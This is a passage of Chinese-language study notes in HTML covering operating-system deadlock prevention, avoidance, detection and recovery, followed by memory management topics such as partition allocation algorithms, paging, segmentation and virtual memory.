破坏不剥夺条件</h4><p>不可剥夺条件：进程所获得的资源在未使用完之前，不能由其它进程强行夺走，只能主动释放。</p><p>破坏不剥夺条件：</p><p>方案一：当某个进程请求新的资源得不到满足时，它必须立即释放保持的所有资源，待以后需要时再重新申请。也就是说，即使某些资源尚未使用完，也需要主动释放，从而破坏了不可剥夺条件。</p><p>方案二：当某个进程需要的资源被其它进程所占有的时候，可以由操作系统协助，将想要的资源强行剥夺。这种方式一般需要考虑各进程的优先级(比如：剥夺调度方式，就是将处理机资源强行剥夺给优先级更高的进程使用)。</p><p>该策略的缺点：</p><ol><li>实现起来比较复杂</li><li>释放已获得的资源可能造成前一阶段工作的失效。因此这种方法一般只适用于易保存和恢复状态的资源，如CPU</li><li>反复地申请和释放资源会增加系统开销，降低系统吞吐量</li><li>若采用方案一，意味着只要暂时得不到某个资源，之前获得的哪些资源就都需要放弃，以后再重新申请。如果一直发生这样的情况，就会导致进程饥饿</li></ol><h4 id="2-12-1-3-破坏请求和保持条件"><a href="#2-12-1-3-破坏请求和保持条件" class="headerlink" title="2.12.1.3 破坏请求和保持条件"></a>2.12.1.3 破坏请求和保持条件</h4><p>请求和保持条件：进程已经保持了至少一个资源，但又提出了新的资源请求，而该资源又被其它进程占有，此时请求进程被阻塞，但又对自己已有的资源保持不放。</p><p>可以采用<strong>静态分配</strong>方法，即进程在运行前一次申请完它所需要的全部资源，在它的资源未满足前，不让它投入运行。一旦投入运行后，这些资源就一直归它所有，该进程就不会在请求别的任何资源了。</p><p>该策略实现起来简单，但也有明显的缺点：有些资源可能只需要用很短的时间，因此如果进程的整个运行期间都一直保持着所有资源，就会造成严重的资源浪费，资源利用率极低。另外，该策略也有可能导致某些进程饥饿。</p><h4 id="2-12-1-4-破坏循环等待条件"><a href="#2-12-1-4-破坏循环等待条件" class="headerlink" title="2.12.1.4 破坏循环等待条件"></a>2.12.1.4 破坏循环等待条件</h4><p>循环等待条件：存在一种进程资源的循环等待链，链中的每一个进程已获得的资源同时被下一个进程所请求。</p><p>可采用<strong>顺序资源分配法</strong>。首先给系统中的资源编号，规定每个进程必须按编号递增的顺序请求资源，同类资源(即编号相同的资源)一次申请完。</p><p>原理分析：一个进程只有已占有小编号资源时，才有资格申请更大编号的资源。按此规则，已持有大编号资源的进程不可能逆向回来申请小编号的资源，从而就不会产生循环等待的现象。</p><img src="/posts/d04bd5bc/2.12.1.4.png" class="" title="顺序资源分配法"><p>该策略的缺点：</p><ol><li>不方便增加新的设备，因为可能需要重新分配所有编号</li><li>进程实际使用资源的顺序可能和编号递增顺序不一致，会导致资源浪费</li><li>必须按规定次序申请资源，用户编程麻烦</li></ol><h3 id="2-12-2-死锁的处理策略——避免死锁-银行家算法"><a href="#2-12-2-死锁的处理策略——避免死锁-银行家算法" class="headerlink" title="2.12.2 死锁的处理策略——避免死锁(银行家算法)"></a>2.12.2 死锁的处理策略——避免死锁(银行家算法)</h3><p>安全序列：如果系统按照这种序列分配资源，则每个进程都能顺利完成。只要能找出一个安全序列，系统就是安全状态。当然，安全序列可能有多个。</p><p>如果分配了资源之后，系统中找不到任何一个安全序列，系统就进入了不安全状态。这就意味着之后可能所有进程都无法顺利地执行下去。当然，如果有进程提前归还了一些资源，那系统也有可能重新回到安全状态，不过我们在分配资源之前总是要考虑到最坏情况。</p><p>如果系统处于安全状态，就一定不会发生死锁。如果系统进入不安全状态，就可能发生死锁(处于不安全状态未必就是发生了死锁，但发生死锁时一定是在不安全状态)。因此可以在资源分配之前预先判断这次分配是否会导致系统进入不安全状态，以此决定是否答应资源分配请求，如果会进入不安全状态，就暂时不答应这次请求，让该进程先阻塞等待，这也是“银行家算法”的核心思想。</p><img src="/posts/d04bd5bc/2.12.2.png" class="" title="银行家算法"><img src="/posts/d04bd5bc/2.12.2.1.png" class="" title="银行家算法"><img src="/posts/d04bd5bc/2.12.2.2.png" class="" title="银行家算法"><img src="/posts/d04bd5bc/2.12.2.3.png" class="" title="银行家算法"><img src="/posts/d04bd5bc/2.12.2.4.png" class="" title="银行家算法"><h3 id="2-12-3-检测和解除"><a href="#2-12-3-检测和解除" class="headerlink" title="2.12.3 检测和解除"></a>2.12.3 检测和解除</h3><p>如果系统中既不采取预防死锁的措施，也不采取避免死锁的措施，系统就很可能发生死锁。在这种情况下，系统应当提供两个算法：</p><ol><li>死锁检测算法：用于检测系统状态，以确定系统中是否发生了死锁</li><li>死锁解除算法：当认定系统中已经发生了死锁，利用该算法可将系统从死锁状态中解脱出来</li></ol><h4 id="2-12-3-1-死锁的检测"><a href="#2-12-3-1-死锁的检测" class="headerlink" title="2.12.3.1 死锁的检测"></a>2.12.3.1 死锁的检测</h4><p>为了能对系统是否已发生了死锁进行检测，必须：</p><p>①用某种数据结构来保存资源的请求和分配信息；</p><p>②提供一种算法，利用上述信息来检测系统是否已进入死锁状态。</p><img src="/posts/d04bd5bc/2.12.3.1.png" class="" title="检测死锁"><img src="/posts/d04bd5bc/2.12.3.2.png" class="" title="检测死锁"><img src="/posts/d04bd5bc/2.12.3.3.png" class="" title="检测死锁"><img src="/posts/d04bd5bc/2.12.3.4.png" class="" title="检测死锁"><h4 id="2-12-3-2-死锁的解除"><a href="#2-12-3-2-死锁的解除" class="headerlink" title="2.12.3.2 死锁的解除"></a>2.12.3.2 死锁的解除</h4><p>一旦检测出死锁的发生，就应该立即解除死锁。</p><p>补充：并不是系统中所有的进程都是死锁状态，用死锁检测算法化简资源分配图后，还连着边的那些进程就是死锁进程。</p><p>解除死锁的主要方法有：</p><ol><li>资源剥夺法。挂起(暂时放到外存上)某些死锁进程，并抢占它的资源，将这些资源分配给其它的死锁进程。但是应防止被挂起的进程长时间得不到资源而饥饿</li><li>撤销进程法(或称终止进程法)。强制撤销部分、甚至全部死锁的进程，并剥夺这些进程的资源。这种方式的优点是实现简单，但所付出的代价可能会很大。因为有些进程可能已经运行了很长时间，已经接近结束了，一旦被终止可谓功亏一篑</li><li>进程回退法。让一个或多个死锁进程回退到足以避免死锁的地步。这就要求系统要记录进程的历史信息，设置还原点</li></ol><p>如何决定牺牲哪个进程？</p><ol><li>进程优先级</li><li>已执行多长时间</li><li>还要多久能完成</li><li>进程已经使用了多少资源</li><li>进程是交互式的还是批处理式的</li></ol><h1 id="3-内存管理"><a href="#3-内存管理" class="headerlink" title="3. 内存管理"></a>3. 内存管理</h1><h2 id="3-1-基础知识"><a href="#3-1-基础知识" class="headerlink" title="3.1 基础知识"></a>3.1 基础知识</h2><p>内存是用于存放数据的硬件。程序执行前需要先放到内存中才能被CPU处理。</p><p>在多道程序环境下，系统中会有多个程序并发执行，也就是说会有多个程序的数据需要同时放到内存中。那么，如何区分各个程序的数据是放在什么地方的呢？给内存的存储单元编地址。</p><p>内存地址从0开始，每个地址对应一个存储单元。如果计算机“按字节编址”，则每个存储单元大小为1字节，即1B，即8个二进制位；如果字长为16位的计算机“按字编址”，则每个存储单元大小为1个字，每个字的大小为16个二进制位。</p><img src="/posts/d04bd5bc/3.1.png" class="" title="存储单元"><img src="/posts/d04bd5bc/3.1.1.png" class="" title="程序运行的基本原理"><p>装入的三种方式(用三种不同的方法完成逻辑地址到物理地址的转换)：</p><ol><li>绝对装入：在编译时，如果知道程序将放到内存中的哪个位置，编译程序将产生绝对地址的目标代码。装入程序按照装入模块中的地址，将程序和数据装入内存。绝对装入只适用于单道程序环境。</li><li>静态重定位：又称可重定位装入。编译、链接后的装入模块的地址都是从0开始的，指令中使用的地址、数据存放的地址都是相对于起始地址而言的逻辑地址。可根据内存的当前情况，将装入模块装入到内存的适当位置。装入时对地址进行“重定位”，将逻辑地址变换为物理地址(地址变换是在装入时一次完成的)。静态重定位的特点是在一个作业装入内存时，必须分配其要求的全部内存空间，如果没有足够的内存，就不能装入该作业。作业一旦进入内存后，在运行期间就不能再移动，也不能再申请内存空间。</li><li>动态重定位：又称动态运行时装入。编译、链接后的装入模块的地址都是从0开始的。装入程序把装入模块装入内存后，并不会立即把逻辑地址转换为物理地址，而是把地址转换推迟到程序真正要执行时才进行。因此装入内存后所有的地址依然是逻辑地址。这种方式需要一个重定位寄存器的支持。采用动态重定位时允许程序在内存中发生移动，并且可将程序分配到不连续的存储区中；在程序运行前只需装入它的部分代码即可投入运行，然后在程序运行期间，根据需要动态申请分配内存；便于程序段的共享，可以向用户提供一个比存储空间大得多的地址空间。</li></ol><p>链接的三种方式：</p><ol><li>静态链接：在程序运行之前，先将各目标模块及它们所需的库函数链接成一个完整的可执行文件(装入模块)，之后不再拆开。</li><li>装入时动态链接：将各目标模块装入内存时，边装入边链接的链接方式。</li><li>运行时动态链接：在程序执行中需要该目标模块时，才对它进行链接。其优点是便于修改和更新，便于实现对目标模块的共享。</li></ol><h2 id="3-2-内存管理"><a href="#3-2-内存管理" class="headerlink" title="3.2 内存管理"></a>3.2 内存管理</h2><p>操作系统作为系统资源的管理者，当然也需要对内存进行管理，要管些什么呢？</p><ol><li>操作系统负责内存空间的分配与回收</li><li>操作系统需要提供某种技术从逻辑上对内存空间进行扩充</li><li>操作系统需要提供地址转换功能，负责程序的逻辑地址与物理地址的转换</li><li>操作系统需要提供内存保护功能，保证各进程在各自存储空间内运行，互不干扰</li></ol><p>内存保护可采取两种方法：</p><ol><li>在CPU设置一对上、下限寄存器，存放进程的上、下限地址。进程的指令要访问某个地址时，CPU检查是否越界。</li><li>采用重定位寄存器(又称基址寄存器)和界地址寄存器(又称限长寄存器)进行越界检查。重定位寄存器中存放的是进程的起始物理地址。界地址寄存器中存放的是进程的最大逻辑地址。</li></ol><h2 id="3-3-内存空间的扩充"><a href="#3-3-内存空间的扩充" class="headerlink" title="3.3 内存空间的扩充"></a>3.3 内存空间的扩充</h2><h3 id="3-3-1-覆盖技术"><a href="#3-3-1-覆盖技术" class="headerlink" title="3.3.1 覆盖技术"></a>3.3.1 覆盖技术</h3><p>早期的计算机内存很小，比如IBM推出的第一台PC机最大只支持1MB大小的内存。因此经常会出现内存大小不够的情况。后来人们引入了覆盖技术，用来解决“程序大小超过物理内存总和”的问题。</p><p>覆盖技术的思想：将程序分为多个段(多个模块)。常用的段常驻内存，不常用的段在需要时调入内存。</p><p>内存中分为一个“固定区”和若干个“覆盖区”。需要常驻内存的段放在“固定区”中，调入后就不再调出(除非运行结束)，不常用的段放在“覆盖区”，需要用到时调入内存，用不到时调出内存。(按照自身逻辑结构，让那些不可能同时被访问的程序段共享同一个覆盖区)</p><p>必须由程序员声明覆盖结构，操作系统完成自动覆盖。缺点：对用户不透明，增加了用户编程负担。</p><h3 id="3-3-2-交换技术"><a href="#3-3-2-交换技术" class="headerlink" title="3.3.2 交换技术"></a>3.3.2 交换技术</h3><p>交换(对换)技术的设计思想：内存空间紧张时，系统将内存中某些进程暂时换出外存，把外存中某些已具备运行条件的进程换入内存(进程在内存与磁盘间动态调度)。</p><p>中级调度(内存调度)，就是要决定将哪个处于挂起状态的进程重新调入内存。(看2.8.1)</p><p>暂时换出外存等待的进程状态为挂起状态，挂起态又可以进一步细分为就绪挂起、阻塞挂起两种状态。(看2.8.2)</p><img src="/posts/d04bd5bc/3.3.2.png" class="" title="交换技术"><h3 id="3-3-3-连续分配管理方式"><a href="#3-3-3-连续分配管理方式" class="headerlink" title="3.3.3 连续分配管理方式"></a>3.3.3 连续分配管理方式</h3><p>连续分配：指为用户进程分配的必须是一个连续的内存空间。</p><h4 id="3-3-3-1-单一连续分配"><a href="#3-3-3-1-单一连续分配" class="headerlink" title="3.3.3.1 单一连续分配"></a>3.3.3.1 单一连续分配</h4><p>在单一连续分配方式中，内存被分为系统区和用户区。系统区通常位于内存的低地址部分，用于存放操作系统相关数据；用户区用于存放用户进程相关数据。内存中只能有一道用户程序，用户程序独占整个用户区空间。</p><p>优点：实现简单；无外部碎片；可以采用覆盖技术扩充内存；不一定需要采取内存保护。</p><p>缺点：只能用于单用户、单任务的操作系统中；有内部碎片；存储器利用率极低。</p><p>内部碎片：分配给某进程的内存区域中，如果有些部分没有用上，就是“内部碎片”。</p><h4 id="3-3-3-2-固定分区分配"><a href="#3-3-3-2-固定分区分配" class="headerlink" title="3.3.3.2 固定分区分配"></a>3.3.3.2 固定分区分配</h4><p>20世纪60年代出现了支持多道程序的系统，为了能在内存中装入多道程序，且这些程序之间又不会相互干扰，于是将整个用户空间划分为若干个固定大小的分区，在每个分区中只装入一道作业，这样就形成了最早的、最简单的一种可运行多道程序的内存管理方式。</p><p>固定分区分配又分为分区大小相等和分区大小不相等：</p><ul><li>分区大小相等：缺乏灵活性，但是很适合用于用一台计算机控制多个相同对象的场合(比如：钢铁厂有n个相同的炼钢炉，就可把内存分为n个大小相等的区域存放n个炼钢炉控制程序)。</li><li>分区大小不等：增加了灵活性，可以满足不同大小的进程需求。根据常在系统中运行的作业大小情况进行划分(比如：划分多个小分区、适量中等分区、少量大分区)。</li></ul><p>操作系统需要建立一个数据结构——分区说明表，来实现各个分区的分配与回收。每个表项对应一个分区，通常按分区大小排列。每个表项包括对应分区的大小、起始地址、状态(是否已分配)。</p><img src="/posts/d04bd5bc/3.3.3.2.png" class="" title="固定分区分配"><h4 id="3-3-3-3-动态分区分配"><a href="#3-3-3-3-动态分区分配" class="headerlink" title="3.3.3.3 动态分区分配"></a>3.3.3.3 动态分区分配</h4><p>动态分区分配又称为可变分区分配。这种分配方式不会预先划分内存分区，而是在进程装入内存时，根据进程的大小动态地建立分区，并使分区的大小正好适合进程的需要，因此系统分区的大小和数目是可变的。</p><p>思考：</p><ol><li>系统要用什么样的数据结构记录内存的使用情况？</li><li>当很多个空闲分区都能满足需求时，应该选择哪个分区进行分配？</li><li>如何进行分区的分配与回收操作？</li></ol><img src="/posts/d04bd5bc/3.3.3.3.1.png" class="" title="问题1"><img src="/posts/d04bd5bc/3.3.3.3.2.png" class="" title="问题2"><img src="/posts/d04bd5bc/3.3.3.3.3.png" class="" title="问题3"><img src="/posts/d04bd5bc/3.3.3.3.4.png" class="" title="问题3"><img src="/posts/d04bd5bc/3.3.3.3.5.png" class="" title="问题3"><img src="/posts/d04bd5bc/3.3.3.3.6.png" class="" title="问题3"><p>动态分区分配没有内部碎片，但是有外部碎片。</p><p>内部碎片：分配给某进程的内存区域中，有些部分没有用上。</p><p>外部碎片：内存中的某些空闲分区由于太小而难以利用。</p><p>如果内存中空闲空间的总和本来可以满足某进程的要求，但由于进程需要的是一整块连续的内存空间，因此这些“碎片”不能满足进程的需求。可以通过紧凑(拼凑)技术来解决外部碎片。</p><h3 id="3-3-4-动态分区分配算法"><a href="#3-3-4-动态分区分配算法" class="headerlink" title="3.3.4 动态分区分配算法"></a>3.3.4 动态分区分配算法</h3><h4 id="3-3-4-1-首次适应算法"><a href="#3-3-4-1-首次适应算法" class="headerlink" title="3.3.4.1 首次适应算法"></a>3.3.4.1 首次适应算法</h4><p>算法思想：每次都从低地址开始查找，找到第一个能满足大小的空闲分区。</p><p>如何实现：空闲分区以地址递增的次序排列。每次分配内存时顺序查找空闲分区链(或空闲分区表)，找到大小能满足要求的第一个空闲分区。</p><h4 id="3-3-4-2-最佳适应算法"><a href="#3-3-4-2-最佳适应算法" class="headerlink" title="3.3.4.2 最佳适应算法"></a>3.3.4.2 最佳适应算法</h4><p>算法思想：由于动态分区分配是一种连续分配方式，为各进程分配的空间必须是连续的一整片区域。因此为了保证当“大进程”到来时能有连续的大片空间，可以尽可能多地留下大片的空闲区，即，优先使用更小的空闲区。</p><p>如何实现：空闲分区按容量递增次序链接。每次分配内存时顺序查找空闲分区链(或空闲分区表)，找到大小能满足要求的第一个空闲分区。</p><h4 id="3-3-4-3-最坏适应算法"><a href="#3-3-4-3-最坏适应算法" class="headerlink" title="3.3.4.3 最坏适应算法"></a>3.3.4.3 最坏适应算法</h4><p>又称最大适应算法。</p><p>算法思想：为了解决最佳适应算法的问题——即留下太多难以利用的小碎片，可以在每次分配时优先使用最大的连续空闲区，这样分配后剩余的空闲区就不会太小，更方便使用。</p><p>如何实现：空闲分区按容量递减次序链接。每次分配内存时顺序查找空闲分区链(或空闲分区表)，找到大小能满足要求的第一个空闲分区。</p><p>缺点：每次都选最大的分区进行分配，虽然可以让分配后留下的空闲区更大，更可用，但是这种方式会导致较大的连续空闲区被迅速用完。如果之后有“大进程”到达，就没有内存分区可用了。</p><h4 id="3-3-4-4-临近适应算法"><a href="#3-3-4-4-临近适应算法" class="headerlink" title="3.3.4.4 临近适应算法"></a>3.3.4.4 临近适应算法</h4><p>算法思想：首次适应算法每次都从链头开始查找的。这可能会导致低地址部分出现很多小的空闲分区，而每次分配查找时，都要经过这些分区，因此也增加了查找的开销。如果每次都从上次查找结束的位置开始检索，就能解决上述问题。</p><p>如何实现：空闲分区以地址递增的顺序排列(可排成一个循环链表)。每次分配内存时从上次查找结束的位置开始查找空闲分区链(或空闲分区表)，找到大小能满足要求的第一个空闲分区。</p><p>首次适应算法每次都要从头查找，每次都需要检索低地址的小分区。但是这种规则也决定了当低地址部分有更小的分区可以满足需求时，会更有可能用到低地址部分的小分区，也会更有可能把高地址部分的大分区保留下来(最佳适应算法的优点)。</p><p>临近适应算法的规则可能会导致无论低地址、高地址部分的空闲分区都有相同的概率被使用，也就导致了高地址部分的大分区更可能被使用，划分为小分区，最后导致无大分区可用(最大适应算法的缺点)。</p><p>综合来看，四种算法中，<strong>首次适应算法</strong>的效果反而更好。</p><h3 id="3-3-5-非连续分配管理方式"><a href="#3-3-5-非连续分配管理方式" class="headerlink" title="3.3.5 非连续分配管理方式"></a>3.3.5 非连续分配管理方式</h3><p>支持多道程序的两种连续分配方式：</p><ol><li>固定分区分配：缺乏灵活性，会产生大量的内部碎片，内存利用率很低</li><li>动态分区分配：会产生很多外部碎片，虽然可以用“紧凑”技术来处理，但是“紧凑”的时间代价很高</li></ol><p>如果允许将一个进程分散地装入到许多不相邻的分区中，便可充分地利用内存，而无需再进行“紧凑”。基于这一思想，产生了“非连续分配方式”，或者称为“离散分配方式”。</p><h4 id="3-3-5-1-基本分页存储管理"><a href="#3-3-5-1-基本分页存储管理" class="headerlink" title="3.3.5.1 基本分页存储管理"></a>3.3.5.1 基本分页存储管理</h4><p>基本分页存储管理的思想：把内存分为一个个相等的小分区，再按照分区大小把进程拆分成一个个小部分。</p><img src="/posts/d04bd5bc/3.3.5.1.png" class="" title="分页存储管理"><p>将进程地址空间分页之后，操作系统该如何实现逻辑地址到物理地址的转换？模块在内存中的“起始地址” + 目标内存单元相对于起始位置的“偏移量”。</p><img src="/posts/d04bd5bc/3.3.5.1.1.png" class="" title="实现地址转换"><img src="/posts/d04bd5bc/3.3.5.1.2.png" class="" title="实现地址转换"><p>结论：如果每个页面大小为<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0" xmlns="http://www.w3.org/2000/svg" width="2.741ex" height="1.914ex" role="img" focusable="false" viewBox="0 -846 1211.6 846"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(533,363) scale(0.707)"><path data-c="1D43E" d="M285 628Q285 635 228 637Q205 637 198 638T191 647Q191 649 193 661Q199 681 203 682Q205 683 214 683H219Q260 681 355 681Q389 681 418 681T463 682T483 682Q500 682 500 674Q500 669 497 660Q496 658 496 654T495 648T493 644T490 641T486 639T479 638T470 637T456 637Q416 636 405 634T387 623L306 305Q307 305 490 449T678 597Q692 611 692 620Q692 635 667 637Q651 637 651 648Q651 650 654 662T659 677Q662 682 676 682Q680 682 711 681T791 680Q814 680 839 681T869 682Q889 682 889 672Q889 650 881 642Q878 637 862 637Q787 632 726 586Q710 576 656 534T556 455L509 418L518 396Q527 374 546 329T581 244Q656 67 661 61Q663 59 666 57Q680 47 717 46H738Q744 38 744 37T741 19Q737 6 731 0H720Q680 3 625 3Q503 3 488 0H478Q472 6 472 9T474 27Q478 40 480 43T491 46H494Q544 46 544 71Q544 75 517 141T485 216L427 354L359 301L291 248L268 155Q245 63 245 58Q245 51 253 49T303 46H334Q340 37 340 35Q340 19 333 5Q328 0 317 0Q314 0 280 1T180 2Q118 2 85 2T49 1Q31 1 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Z"></path></g></g></g></g></svg></mjx-container>B，用二进制数表示逻辑地址，则末尾K位即为页内偏移量，其余部分就是页号。</p><p>因此，如果让每个页面的大小为2的整数幂，计算机就可以很方便地得出一个逻辑地址对应的页号和页内偏移量。</p><img src="/posts/d04bd5bc/3.3.5.1.3.png" class="" title="逻辑地址结构"><p>为了能知道进程的每个页面在内存中存放的位置，操作系统要为每个进程建立一张页表。</p><img src="/posts/d04bd5bc/3.3.5.1.4.png" class="" title="页表"><img src="/posts/d04bd5bc/3.3.5.1.5.png" class="" title="页表"><h5 id="3-3-5-1-1-基本地址变换机构"><a href="#3-3-5-1-1-基本地址变换机构" class="headerlink" title="3.3.5.1.1 基本地址变换机构"></a>3.3.5.1.1 基本地址变换机构</h5><p>基本地址变换机构可以借助进程的页表将逻辑地址转换为物理地址。通常会在系统中设置一个页表寄存器(PTR)，存放页表在内存中的起始地址F和页表长度M。进程未执行时，页表的起始地址和页表长度放在进程控制块(PCB)中，当进程被调度时，操作系统内核会把它们放在页表寄存器中。</p><img src="/posts/d04bd5bc/3.3.5.1.1.1.png" class="" title="基本地址变换机构"><img src="/posts/d04bd5bc/3.3.5.1.1.2.png" class="" title="基本地址变换机构"><img src="/posts/d04bd5bc/3.3.5.1.1.3.png" class="" title="基本地址变换机构"><p>基本地址变换机构需要两次访问内存，第一次访问内存是查页表，第二次访问内存是访问目标内存单元。</p><h5 id="3-3-5-1-2-具有快表的地址变换机构"><a href="#3-3-5-1-2-具有快表的地址变换机构" class="headerlink" title="3.3.5.1.2 具有快表的地址变换机构"></a>3.3.5.1.2 具有快表的地址变换机构</h5><p>是基本地址变换机构的改进版本。</p><p>局部性原理：</p><ul><li>时间局部性：如果执行了程序中的某条指令，那么不久后这条指令很有可能再次执行；如果某个数据被访问过，不久之后该数据很可能再次被访问。(因为程序中存在大量的循环)</li><li>空间局部性：一旦程序访问了某个存储单元，在不久之后，其附近的存储单元也很有可能被访问。(因为很多数据在内存中都是连续存放的)</li></ul><p>基本地址变换机构中，每次要访问一个逻辑地址，都需要查询内存中的页表。由于局部性原理，可能连续很多次查到的都是同一个页表项。既然如此，能否利用这个特性减少访问页表的次数呢？</p><p>快表，又称联想寄存器(TLB)，是一种访问速度比内存快很多的高速缓冲存储器，用来存放当前访问的若干页表项，以加速地址变换的过程。与此对应，内存中的页表常称为慢表。</p><img src="/posts/d04bd5bc/3.3.5.1.2.1.png" class="" title="快表机制"><img src="/posts/d04bd5bc/3.3.5.1.2.2.png" class="" title="快表机制"><h5 id="3-3-5-1-3-两级页表"><a href="#3-3-5-1-3-两级页表" class="headerlink" title="3.3.5.1.3 两级页表"></a>3.3.5.1.3 两级页表</h5><p>单级页表存在的问题：①页表必须连续存放，因此当页表很大时，需要占用很多个连续的页框；②没有必要让整个页表常驻内存，因为进程在一段时间内可能只需要访问几个特定的页面。</p><p>解决问题一：</p><img src="/posts/d04bd5bc/3.3.5.1.3.1.png" class="" title="问题一"><img src="/posts/d04bd5bc/3.3.5.1.3.2.png" class="" title="问题一"><img src="/posts/d04bd5bc/3.3.5.1.3.3.png" class="" title="问题一"><p>解决问题二：</p><img src="/posts/d04bd5bc/3.3.5.1.3.4.png" class="" title="问题二"><img src="/posts/d04bd5bc/3.3.5.1.3.5.png" class="" title="小细节"><h4 id="3-3-5-2-基本分段存储管理"><a href="#3-3-5-2-基本分段存储管理" class="headerlink" title="3.3.5.2 基本分段存储管理"></a>3.3.5.2 基本分段存储管理</h4><p>进程的地址空间：按照程序自身的逻辑关系划分为若干个段，每个段都有一个段名(在低级语言中，程序员使用段名来编程)，每段从0开始编址。</p><p>内存分配规则：以段为单位进行分配，每个段在内存中占据连续空间，但各段之间可以不相邻。</p><img src="/posts/d04bd5bc/3.3.5.2.1.png" class="" title="基本分段存储管理"><img src="/posts/d04bd5bc/3.3.5.2.2.png" class="" title="基本分段存储管理"><img src="/posts/d04bd5bc/3.3.5.2.3.png" class="" title="基本分段存储管理"><img src="/posts/d04bd5bc/3.3.5.2.4.png" class="" title="基本分段存储管理"><h4 id="3-3-5-3-分段、分页管理的对比"><a href="#3-3-5-3-分段、分页管理的对比" class="headerlink" title="3.3.5.3 分段、分页管理的对比"></a>3.3.5.3 分段、分页管理的对比</h4><p>页是信息的物理单位。分页的主要目的是为了实现离散分配，提高内存利用率。分页仅仅是系统管理上的需要，完全是系统行为，对用户是不可见的。</p><p>段是信息的逻辑单位。分段的主要目的是更好地满足用户需求。一个段通常包含着一组属于一个逻辑模块的信息。分段对用户是可见的，用户编程时需要显式地给出段名。</p><p>页的大小固定且由系统决定。段的长度却不固定，决定于用户编写的程序。</p><p>分页的用户进程地址空间是一维的，程序员只需给出一个记忆符即可表示一个地址。分段的用户进程地址空间是二维的，程序员在标识一个地址时，既要给出段名，也要给出段内地址。</p><img src="/posts/d04bd5bc/3.3.5.3.1.png" class="" title="分段分页管理的对比"><img src="/posts/d04bd5bc/3.3.5.3.2.png" class="" title="分段分页管理的对比"><p>分段存储中也可以引入快表机制。</p><h4 id="3-3-5-4-段页式存储管理"><a href="#3-3-5-4-段页式存储管理" class="headerlink" title="3.3.5.4 段页式存储管理"></a>3.3.5.4 段页式存储管理</h4><h5 id="3-3-5-4-1-分页、分段的优缺点"><a href="#3-3-5-4-1-分页、分段的优缺点" class="headerlink" title="3.3.5.4.1 分页、分段的优缺点"></a>3.3.5.4.1 分页、分段的优缺点</h5><div class="table-container"><table><thead><tr><th></th><th>优点</th><th>缺点</th></tr></thead><tbody><tr><td>分页管理</td><td>内存空间利用率高，不会产生外部碎片，只会有少量的页内碎片</td><td>不方便按照逻辑模块实现信息的共享和保护</td></tr><tr><td>分段管理</td><td>很方便按照逻辑模块实现信息的共享和保护</td><td>如果段长过大，为其分配很大的连续空间会很不方便。另外，段式管理会产生外部碎片</td></tr></tbody></table></div><h5 id="3-3-5-4-2-段页式管理"><a href="#3-3-5-4-2-段页式管理" class="headerlink" title="3.3.5.4.2 段页式管理"></a>3.3.5.4.2 段页式管理</h5><img src="/posts/d04bd5bc/3.3.5.4.2.png" class="" title="段页式管理"><img src="/posts/d04bd5bc/3.3.5.4.2.1.png" class="" title="段页式管理"><img src="/posts/d04bd5bc/3.3.5.4.2.2.png" class="" title="段页式管理"><h3 id="3-3-6-虚拟内存"><a href="#3-3-6-虚拟内存" class="headerlink" title="3.3.6 虚拟内存"></a>3.3.6 虚拟内存</h3><img src="/posts/d04bd5bc/3.3.6.1.png" class="" title="传统管理方式的特征"><p>局部性原理：(看3.3.5.1.2)</p><p>高速缓冲技术的思想：将近期会频繁访问到的数据放到更高速的存储器中，暂时用不到的数据放在更低速存储器中。快表机构就是将近期常访问的页表项副本放到更高速的联想寄存器中。</p><img src="/posts/d04bd5bc/3.3.6.2.png" class="" title="虚拟内存的定义和特征"><p>虚拟内存有以下三个主要特征：</p><ul><li>多次性：无需在作业运行时一次性全部装入内存，而是允许被分成多次调入内存</li><li>对换性：在作业运行时无需一直常驻内存，而是允许在作业运行过程中，将作业换入、换出</li><li>虚拟性：从逻辑上扩充了内存的容量，使用户看到的内存容量，远大于实际的容量</li></ul><img src="/posts/d04bd5bc/3.3.6.3.png" class="" title="实现虚拟内存技术"><h4 id="3-3-6-1-请求分页管理方式"><a href="#3-3-6-1-请求分页管理方式" class="headerlink" title="3.3.6.1 请求分页管理方式"></a>3.3.6.1 请求分页管理方式</h4><img src="/posts/d04bd5bc/3.3.6.4.png" class="" title="请求分页管理方式"><img src="/posts/d04bd5bc/3.3.6.5.png" class="" title="缺页中断"><p>缺页中断是因为当前执行的指令想要访问的目标页面未调入内存而产生的，因此属于内中断。</p><p>一条指令在执行期间，可能产生多次缺页中断。(如：copy A to B，即将逻辑地址A中的数据复制到逻辑地址B，而A、B属于不同的页面，则有可能产生两次中断)</p><img src="/posts/d04bd5bc/3.3.6.6.png" class="" title="请求分页地址变换机构"><img src="/posts/d04bd5bc/3.3.6.7.png" class="" title="请求分页地址变换机构"><h4 id="3-3-6-2-页面置换算法"><a href="#3-3-6-2-页面置换算法" class="headerlink" title="3.3.6.2 页面置换算法"></a>3.3.6.2 页面置换算法</h4><img src="/posts/d04bd5bc/3.3.6.8.png" class="" title="页面置换算法"><h5 id="3-3-6-2-1-最佳置换算法-OPT"><a href="#3-3-6-2-1-最佳置换算法-OPT" class="headerlink" title="3.3.6.2.1 最佳置换算法(OPT)"></a>3.3.6.2.1 最佳置换算法(OPT)</h5><img src="/posts/d04bd5bc/3.3.6.9.png" class="" title="最佳置换算法"><p>最佳置换算法可以保证最低的缺页率，但实际上只有在进程执行的过程中才能知道接下来会访问到的是哪个页面。操作系统无法提前预判页面访问序列。因此，最佳置换算法是无法实现的。</p><h5 id="3-3-6-2-2-先进先出置换算法-FIFO"><a href="#3-3-6-2-2-先进先出置换算法-FIFO" class="headerlink" title="3.3.6.2.2 先进先出置换算法(FIFO)"></a>3.3.6.2.2 先进先出置换算法(FIFO)</h5><img src="/posts/d04bd5bc/3.3.6.10.png" 